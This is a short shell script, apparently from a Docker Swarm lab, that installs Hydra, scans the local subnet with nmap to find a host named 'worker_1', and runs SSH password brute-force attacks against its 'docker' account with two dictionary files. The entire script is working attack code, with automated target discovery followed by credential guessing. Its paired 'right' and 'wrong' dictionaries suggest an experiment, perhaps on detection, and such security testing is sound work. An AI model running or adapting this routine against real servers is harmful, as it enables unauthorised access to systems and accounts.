sudo apt update
sudo apt upgrade -y
sudo apt install hydra -y
clear
echo "SSH brute force attack with Hydra"
network=$(ifconfig | grep inet |  sed -n 1p | awk "{print \$2}" | cut -f 1-3 -d "."  | sed 's/$/.*/')    
worker1IP=$(nmap -sP $network | grep worker_1 | awk '{print $NF}' | tr -d '()')
echo "Swarm network is " $network
echo "Starting attack with right dictionary to worker 1 with the IP address: " $worker1IP
hydra -l docker -P lexikoright  $worker1IP  -t 4 ssh
printf "\n\n\n"
echo "Starting attack with wrong dictionary to worker 1 with the IP address: " $worker1IP
hydra -l docker -P lexikowrong  $worker1IP  -t 4 ssh